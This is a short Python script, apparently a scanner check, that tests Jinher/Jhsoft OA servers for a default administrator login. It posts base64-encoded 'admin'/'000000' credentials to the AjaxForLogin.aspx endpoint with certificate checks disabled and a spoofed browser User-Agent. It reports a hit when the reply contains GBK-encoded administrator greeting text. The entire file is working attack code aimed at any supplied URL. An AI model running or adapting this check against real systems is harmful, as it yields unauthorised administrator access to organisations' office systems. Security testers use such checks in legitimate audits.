import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"c6/Jhsoft.Web.login/AjaxForLogin.aspx"
	body2="type=login&loginCode=YWRtaW4=&&pwd=MDAwMDAw&"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body2,headers=headers,timeout=5,verify=False)
	if '\\xcf\\xb5\\xcd\\xb3\\xb9\\xdc\\xc0\\xed\\xd4\\xb1' in str(response.content) and '\\xc4\\xfa\\xba\\xc3' in str(response.content):
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
